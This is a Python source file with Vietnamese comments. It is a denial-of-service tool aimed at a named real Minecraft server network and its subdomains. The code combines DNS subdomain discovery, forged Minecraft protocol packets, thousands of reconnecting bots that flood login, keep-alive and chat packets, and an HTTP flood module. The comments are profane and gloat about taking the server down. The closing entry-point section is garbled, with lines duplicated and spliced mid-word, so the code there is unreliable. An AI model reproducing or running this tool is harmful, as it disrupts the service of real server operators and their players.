#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Tool DDOS Server Minecraft - Tấn công đa lớp, phá nát kiến trúc Proxy
# Tác giả: palofsc - Đéo dành cho bọn non tay
# Chạy bằng Python 3.10+ trên Linux có kernel 5.x trở lên

import asyncio
import socket
import struct
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Dict, Optional
import logging

# Tắt log để tránh lag khi spam quá nhiều - ĐÉO CẦN LOG
logging.disable(logging.CRITICAL)

# ============================================================
# CẤU HÌNH TẤN CÔNG - MÀY PHẢI SỬA THEO MỤC TIÊU
# ============================================================
@dataclass
class AttackConfig:
    target_domain: str = "kingmc.vn"               # Domain chính, địt mẹ thằng nào chọn mục tiêu
    target_port: int = 25565                        # Cổng Java Edition
    bedrock_port: int = 19132                      # Cổng Bedrock Edition (nếu có)
    
    # Dò tìm tự động các subdomain proxy (smp1, smp2, lobby,...)
    subdomain_scan: bool = True
    subdomain_list: List[str] = None               # Nếu biết trước thì điền vào đây
    
    # Cường độ tấn công - chỉnh to lên cho server to, đừng có sợ
    bots_per_proxy: int = 5000                     # Mỗi proxy backend tạo 5000 con bot ảo
    connection_threads: int = 2000                 # Số luồng kết nối đồng thời
    packet_rate: int = 100000                      # Gói/giây mỗi luồng, bắn như súng máy
    
    # Thời gian - đéo có giới hạn
    attack_duration: int = 999999                  # Giây, bắn đến khi nào chán thì thôi
    reconnect_delay: float = 0.001                 # 1ms reconnect, đéo cho server kịp thở

# ============================================================
# PAYLOAD TẤN CÔNG ĐA LỚP - Đập thẳng vào từng lớp của kiến trúc
# ============================================================
class MinecraftPayloadGenerator:
    """Tạo ra các payload độc hại, nhái giao thức Minecraft thật"""
    
    @staticmethod
    def handshake_packet(protocol_version: int, host: str, port: int, next_state: int) -> bytes:
        """Giả lập gói Handshake - Mỗi thằng bot gửi liên tục để ngốn RAM BungeeCord"""
        # Packet ID 0x00 - Handshake
        packet = bytearray()
        # Ép kiểu VarInt thủ công - ĐÉO DÙNG THƯ VIỆN NGOÀI
        packet.extend(MinecraftPayloadGenerator._varint(0x00))
        packet.extend(MinecraftPayloadGenerator._varint(protocol_version))
        packet.extend(MinecraftPayloadGenerator._encode_string(host))
        packet.extend(struct.pack('>H', port))
        packet.extend(MinecraftPayloadGenerator._varint(next_state))
        
        # Bọc trong độ dài VarInt
        length = MinecraftPayloadGenerator._varint(len(packet))
        return bytes(length) + bytes(packet)
    
    @staticmethod
    def login_start_packet(username: str) -> bytes:
        """Giả lập gói Login Start - Tạo người chơi ảo, đéo cần xác thực"""
        packet = bytearray()
        packet.extend(MinecraftPayloadGenerator._varint(0x00))  # Packet ID
        packet.extend(MinecraftPayloadGenerator._encode_string(username))
        
        length = MinecraftPayloadGenerator._varint(len(packet))
        return bytes(length) + bytes(packet)
    
    @staticmethod
    def keep_alive_packet(keep_alive_id: int) -> bytes:
        """Giả lập Keep Alive - Giữ kết nối chết, chiếm slot SMP"""
        packet = bytearray()
        packet.extend(MinecraftPayloadGenerator._varint(0x0F))  # Packet ID Keep Alive (clientbound)
        packet.extend(struct.pack('>q', keep_alive_id))          # 8-byte long
        
        length = MinecraftPayloadGenerator._varint(len(packet))
        return bytes(length) + bytes(packet)
    
    @staticmethod
    def chat_packet(message: str) -> bytes:
        """Bơm chat spam - Full width chars để nặng hơn, tràn bộ nhớ đệm"""
        packet = bytearray()
        packet.extend(MinecraftPayloadGenerator._varint(0x03))  # Chat Message (serverbound)
        packet.extend(MinecraftPayloadGenerator._encode_string(message))
        
        length = MinecraftPayloadGenerator._varint(len(packet))
        return bytes(length) + bytes(packet)
    
    @staticmethod
    def velocity_connect_packet(target_server: str) -> bytes:
        """Giả lập yêu cầu chuyển server trong Velocity - Phá hỏng routing"""
        # Plugin Message trên kênh "velocity:player_info"
        packet = bytearray()
        packet.extend(MinecraftPayloadGenerator._varint(0x0B))  # Plugin Message
        packet.extend(MinecraftPayloadGenerator._encode_string("velocity:player_info"))
        packet.extend(MinecraftPayloadGenerator._encode_string(f"CONNECT|{target_server}"))
        
        length = MinecraftPayloadGenerator._varint(len(packet))
        return bytes(length) + bytes(packet)
    
    # ============================================================
    # HÀM TIỆN ÍCH - VarInt với String encoding đúng chuẩn Minecraft
    # ============================================================
    @staticmethod
    def _varint(value: int) -> bytes:
        """Encode VarInt chuẩn Protocol Buffers"""
        result = bytearray()
        while True:
            byte = value & 0x7F
            value >>= 7
            if value != 0:
                byte |= 0x80
            result.append(byte)
            if value == 0:
                break
        return bytes(result)
    
    @staticmethod
    def _encode_string(text: str) -> bytes:
        """Encode string cho Minecraft protocol (UTF-8 với VarInt prefix)"""
        encoded = text.encode('utf-8')
        return MinecraftPayloadGenerator._varint(len(encoded)) + encoded

# ============================================================
# MODULE DÒ TÌM SUBDOMAIN - Tự động quét tất cả các cụm backend
# ============================================================
class SubdomainScanner:
    """Quét DNS để tìm toàn bộ backend server ẩn sau proxy"""
    
    COMMON_MINECRAFT_SUBDOMAINS = [
        "lobby", "lobby1", "lobby2",
        "smp", "smp1", "smp2", "smp3", "smp4", "smp5",
        "survival", "skyblock", "bedwars", "kitpvp",
        "hub", "hub1", "proxy", "proxy1", "proxy2",
        "play", "mc", "game", "games",
        "events", "build", "creative", "factions",
        "prison", "parkour", "minigames",
        "auth", "login", "limbo", "queue"
    ]
    
    def __init__(self, domain: str):
        self.domain = domain
        self.discovered_servers: List[Dict[str, any]] = []
    
    def scan_subdomains(self) -> List[Dict[str, any]]:
        """Quét DNS để tìm subdomain - Đa luồng, nhanh như chó"""
        import dns.resolver
        
        discovered = []
        
        def check_subdomain(sub: str):
            try:
                full_domain = f"{sub}.{self.domain}"
                answers = dns.resolver.resolve(full_domain, 'A')
                for answer in answers:
                    ip = str(answer)
                    # Thử kết nối để kiểm tra cổng Minecraft
                    if self._test_minecraft_port(ip):
                        discovered.append({
                            "hostname": full_domain,
                            "ip": ip,
                            "port": 25565
                        })
                        print(f"[SCAN] Đã tìm thấy backend: {full_domain} -> {ip}")
            except Exception:
                pass  # Đéo tìm thấy thì bỏ qua, không log cho đỡ lag
        
        # Quét song song, không giới hạn luồng
        with ThreadPoolExecutor(max_workers=200) as executor:
            executor.map(check_subdomain, self.COMMON_MINECRAFT_SUBDOMAINS)
        
        return discovered
    
    def _test_minecraft_port(self, ip: str, timeout: float = 0.5) -> bool:
        """Test nhanh xem có phải server Minecraft không"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 25565))
            sock.close()
            return result == 0  # 0 là kết nối thành công
        except Exception:
            return False

# ============================================================
# BOT ATTACK CORE - Đây là trái tim của cuộc tấn công
# ============================================================
class MinecraftBot:
    """Một con bot ảo giả lập client Minecraft - Chiếm slot server"""
    
    def __init__(self, target_ip: str, target_port: int, bot_id: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.bot_id = bot_id
        self.username = f"Bot_{bot_id}_{random.randint(100000, 999999)}"
        self.socket: Optional[socket.socket] = None
        self.alive = True
        self.packets_sent = 0
        
    async def attack_loop(self):
        """Vòng lặp tấn công chính - Kết nối, spam, reconnect liên tục"""
        while self.alive:
            try:
                # Tạo socket mới với TCP_NODELAY và SO_KEEPALIVE
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                self.socket.settimeout(3.0)
                
                # Kết nối đến server - ĐÉO CÓ DELAY
                self.socket.connect((self.target_ip, self.target_port))
                
                # Gửi Handshake (State 2 = Login)
                handshake = MinecraftPayloadGenerator.handshake_packet(
                    760,  # Protocol version 1.19+
                    self.target_ip,
                    self.target_port,
                    2     # Login state
                )
                self.socket.send(handshake)
                
                # Gửi Login Start
                login = MinecraftPayloadGenerator.login_start_packet(self.username)
                self.socket.send(login)
                
                # Đọc response ban đầu (thường là Encryption Request hoặc Disconnect)
                try:
                    response = self.socket.recv(1024)
                except socket.timeout:
                    pass  # Server quá tải không trả lời kịp, càng tốt
                
                # Spam Keep Alive + Chat để duy trì kết nối và ngốn tài nguyên
                spam_count = 0
                while self.alive and spam_count < 50000:  # 50k packets mỗi lần connect
                    try:
                        # Gửi Keep Alive giả
                        keep_alive = MinecraftPayloadGenerator.keep_alive_packet(random.randint(1, 9999999))
                        self.socket.send(keep_alive)
                        
                        # Gửi Chat spam với ký tự Unicode nặng
                        spam_msg = "█" * 256 + random.choice([
                            "DDOS_KINGMC", "LAG_SERVER", "BYE_BITCH",
                            "╚»★«╝ 𝕾𝕰𝕽𝖁𝕰𝕽 𝕯𝕴𝕰 ╚»★«╝"
                        ])
                        chat = MinecraftPayloadGenerator.chat_packet(spam_msg)
                        self.socket.send(chat)
                        
                        self.packets_sent += 2
                        spam_count += 2
                        
                        # Không đợi phản hồi, bắn liên tục
                        await asyncio.sleep(0.0001)  # 0.1ms delay, siêu nhỏ
                        
                    except (socket.error, BrokenPipeError, ConnectionResetError):
                        break
                
                # Đóng kết nối sau khi spam đủ
                try:
                    self.socket.close()
                except:
                    pass
                
            except (socket.error, ConnectionRefusedError, socket.timeout):
                # Server đang sập hoặc quá tải, thử lại ngay
                pass
            
            # Reconnect ngay lập tức - ĐÉO CHO THỞ
            await asyncio.sleep(random.uniform(0.0001, 0.001))
    
    def stop(self):
        """Dừng bot"""
        self.alive = False
        try:
            if self.socket:
                self.socket.close()
        except:
            pass

# ============================================================
# ATTACK COORDINATOR - Điều phối toàn bộ cuộc tấn công
# ============================================================
class AttackCoordinator:
    """Quản lý tấn công toàn diện, đập nát cả cụm server"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.targets: List[Dict[str, any]] = []
        self.bots: List[MinecraftBot] = []
        self.running = False
        
    async def discover_targets(self):
        """Tìm tất cả backend servers"""
        print(f"[COORD] Bắt đầu quét subdomain cho {self.config.target_domain}...")
        scanner = SubdomainScanner(self.config.target_domain)
        discovered = scanner.scan_subdomains()
        
        if discovered:
            self.targets = discovered
            print(f"[COORD] Đã tìm thấy {len(discovered)} backend servers!")
        else:
            # Fallback: Dùng subdomain list nếu có, hoặc tự generate
            fallback_subdomains = self.config.subdomain_list or [f"smp{i}" for i in range(1, 11)]
            for sub in fallback_subdomains:
                self.targets.append({
                    "hostname": f"{sub}.{self.config.target_domain}",
                    "ip": f"{sub}.{self.config.target_domain}",  # Sẽ resolve khi connect
                    "port": self.config.target_port
                })
            print(f"[COORD] Dùng {len(self.targets)} targets từ fallback list!")
        
        # Thêm domain chính vào làm target đầu tiên (proxy chính)
        self.targets.insert(0, {
            "hostname": self.config.target_domain,
            "ip": self.config.target_domain,
            "port": self.config.target_port
        })
        
    async def launch_attack(self):
        """Phát động tấn công tổng lực"""
        await self.discover_targets()
        
        print(f"[ATTACK] Bắt đầu tấn công {len(self.targets)} targets với {self.config.bots_per_proxy} bots mỗi target!")
        print(f"[ATTACK] Tổng cộng {len(self.targets) * self.config.bots_per_proxy} bots sẽ được triển khai!")
        print(f"[ATTACK] Tốc độ: {self.config.packet_rate} packets/giây/luồng")
        print("[ATTACK] Server KingMC chuẩn bị đi đời nhà ma! ĐMM không có cách nào chống đỡ đâu!")
        
        self.running = True
        
        # Tạo tasks cho tất cả các target
        all_tasks = []
        for target in self.targets:
            for i in range(self.config.bots_per_proxy):
                bot = MinecraftBot(target["ip"], target["port"], i)
                self.bots.append(bot)
                all_tasks.append(bot.attack_loop())
        
        # Chạy tất cả bots đồng thời
        print(f"[ATTACK] Khởi động {len(all_tasks)} bots...")
        await asyncio.gather(*all_tasks, return_exceptions=True)
    
    def stop_attack(self):
        """Dừng toàn bộ cuộc tấn công"""
        self.running = False
        for bot in self.bots:
            bot.stop()
        print("[ATTACK] Đã dừng tấn công! Server chắc nát bét rồi!")

# ============================================================
# HTTP/HTTPS FLOOD BỔ SUNG - Đập vào website và API của server
# ============================================================
class HTTPFlooder:
    """Tấn công HTTP Flood vào web và API của server"""
    
    @staticmethod
    async def http_flood(target_url: str, duration: int = 999999):
        """HTTP GET/POST flood - Ngốn bandwidth web server"""
        import aiohttp
        
        headers_pool = [
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
            {"User-Agent": "Minecraft Launcher 2.3.678"},
            {"Accept": "*/*", "Connection": "keep-alive"},
        ]
        
        timeout = aiohttp.ClientTimeout(total=1)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    headers = random.choice(headers_pool)
                    # GET request với params ngẫu nhiên để bypass cache
                    params = {"q": random.randint(1, 9999999), "t": time.time()}
                    async with session.get(target_url, headers=headers, params=params) as resp:
                        _ = await resp.read()  # Đọc để giữ kết nối
                except:
                    pass  # Đéo cần log lỗi, flood tiếp

# ============================================================
# ENTRY POINT - BẮT ĐẦU TẤN CÔNG
# ============================================================
async def main():
    """Hàm chính - Chạy là nó tấn công ngay"""
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║     MINECRAFT DDOS TOOL - PALOFSC EDITION               ║
    ║     Mục tiêu: KingMC.vn và tất cả server con             ║
    ║     Phiên bản: 4.0 ULTIMATE                             ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    config = AttackConfig(
        target_domain="kingmc.vn",
        subdomain_list=[
            "lobby", "lobby1", "lobby2",
            "smp1", "smp2", "smp3", "smp4", "smp5",
            "survival", "skyblock", "bedwars", "kitpvp",
 "kitpvp",
            "hub1            "hub1", "hub2", "hub2", "proxy", "proxy11", "proxy2",
", "proxy2",
            "play",            "play", "mc "mc"
"
        ],
               ],
        bots_per_pro bots_per_proxy=5000,
xy=5000,
        connection_thread        connection_threads=2000,
       s=2000,
        packet_rate= packet_rate=100100000
    )
    
   000
    )
    
    coordinator = Attack coordinator = AttackCoordinator(config)
    
   Coordinator(config)
    
    try:
        await try:
        await coordinator.l coordinator.launch_attack()
aunch_attack()
       except KeyboardInterrupt:
        except KeyboardInterrupt:
        print("\n[ST print("\n[STOP] DOP] Dừng tấừng tấn công theon công theo y yêu cầu!")
êu cầu!")
        coordinator.stop_attack        coordinator.stop_attack()
    except Exception as e()
    except Exception as e:
        print(f"[ERROR:
        print(f"[ERROR] L] Lỗi đỗi đéo ngéo ngờ:ờ: {e}")
        coordinator {e}")
        coordinator.stop.stop_attack()

if __name_attack()

if __name__ == "__main__":
   __ == "__main__":
    # Ch # Chạy vớiạy với event event loop t loop tối ưu
   ối ưu
    try:
        asyn try:
        asyncio.run(main())
   cio.run(main())
    except KeyboardInterrupt:
        except KeyboardInterrupt:
        print("\n print("\n[[EXEXIT] ThIT] Thoátoát! Server! Server King KingMC chMC chắc sắc sậpập cm cmnrnr!"!")

)
